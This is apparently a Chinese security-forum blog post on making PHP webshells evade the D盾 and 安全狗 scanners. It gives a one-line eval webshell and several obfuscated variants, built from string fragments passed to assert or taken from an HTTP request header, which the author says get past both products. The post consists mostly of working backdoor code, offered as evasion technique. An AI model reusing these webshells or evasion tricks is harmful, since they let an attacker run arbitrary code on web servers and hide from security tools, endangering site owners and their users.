前言
--

看到QQ空间很多师傅都在晒某引擎的 webshell 免杀，心里还是有点摩拳擦掌的，但一直没有下定决心去尝试。一方面确实是没有信心，因为真的没有接触过，一方面还是最近很多事情影响了自己的心情，对自我能力有了否定心理。等到我想去试试的时候，引擎已经关了，活动结束了。所以这里只能找一下D盾和安全狗测试了。

bypass
------

这里我下载了最新版的D盾V2.1.6.2（2022-01-05）和网站安全狗V4.0，php版本为 7.4.27  
首先，下面是经典的php一句话木马，当然这百分百会被检测到。

```php
<?php eval($_POST['dotast']);?>
```

这里我们可以看做两个输入变量，一个是函数，一个是参数。我个人认为，免杀webshell是对防护规则的 bypass，所以我们要了解对应的防护软件的规则。首先我们保持函数不变，将变量改为不敏感的字符串，看看`eval`的检测情况

```php
<?php eval("123dotast");?>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1132d8058ca2a3cf33f4716821516f6a7f71ed19.png)  
显然，D盾对于`eval`函数依然能检测到，我们换成其他能够代码执行的函数，这里举例`assert`

> assert()：如果 参数 是字符串，它将会被 assert() 当做 PHP 代码来执行。注意：从php7版本以后不支持动态调用

```php
<?php
    assert("123");
?>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-9d44fbe700a6da4980fb23d471a97ff1dcfa7be1.png)  
依然能检测到，不过可以看见，不管是前面的`eval`和`assert`函数，现在级别都是判定为1。这里我们开始把目光转向参数，尝试对参数内容进行处理

> implode(strings $glue, array $pieces)：将一个一维数组的值转化为字符串

```php
<?php
    function dotast(){
        $a = implode("",['p','h','p','i','n','f','o','(',')']);
        assert($a);
    }
    dotast();
?>
```

这里将参数内容分离，然后再重新组合  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ae13ad795b9e07cbb2df88af13c3aaa84a910bcd.png)  
可以看见虽然还是能检测到，但是和之前的判定有区别，D盾已经无法识别出参数内容。进行到这里的时候，发现了一个有意思的事情，即再前面定义的变量和`assert`函数中间加一下内容，就能 bypass D盾的检测（同时还是因为加了一层自定义函数 dotast 的缘故)

```php
<?php
    function dotast(){
        $a = implode("",['p','h','p','i','n','f','o','(',')']);
        echo "666";
        assert($a);
    }
    dotast();
?>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-8d59f127fe6f4600e4172959695cd678e178eed3.png)  
所以，一个简单的 bypass D盾的webshell就出来了

```php
<?php
    function dotast(){
        $a = implode("",["e","v","a","l","(","$","_","P","O","S","T","[","'","a","'","]",")"]);
        assert($a);
    }
    dotast();
?>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a32ee5da13a7f2d026e756b5869feb81b96893c4.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3188f4cf2f5647e25b52e711b1550087e8b3785c.png)  
网站安全狗也成功绕过（我感觉安全狗的规则比D盾弱很多......）  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0489fe74c1f3b704e185d8a49157701324ee38c5.png)

接下来，尝试其他姿势，依然是`assert`，这次我们配合其他函数，比如`getallheaders()`从请求头中获取参数内容

> getallheaders()：获取全部 HTTP 请求头信息，返回值为当前请求所有头信息的数组

```php
<?php
    $a = getallheaders();
    $b = $a['Dotast'];
    assert($d);
?>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-66dea2836d8b4ed4286fc1826d304fa445e5576d.png)  
检测级别为1，不过对参数内容未知，我们继续加入一些字符串尝试绕过，这里我的想法是添加一些能让D盾识别到的字符串来达到一种“欺骗”的效果

```php
<?php
    $a = getallheaders();
    $b = $a['Dotast'];
    $c = "123";
    $d = "${b}${c}";
    assert($d);
?>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ec3ad97e001bd9d38de19d27d7c20c2256268d4d.png)  
成功绕过D盾的检测

总结
--

这篇文章也只是做一个 webshell 免杀的思路分享，技巧性的东西其实没什么。我觉得 webshell 免杀更多的其实是想法，对于一个waf的规则熟悉之后，就是开拓思路去思考和罗列出哪些利用点。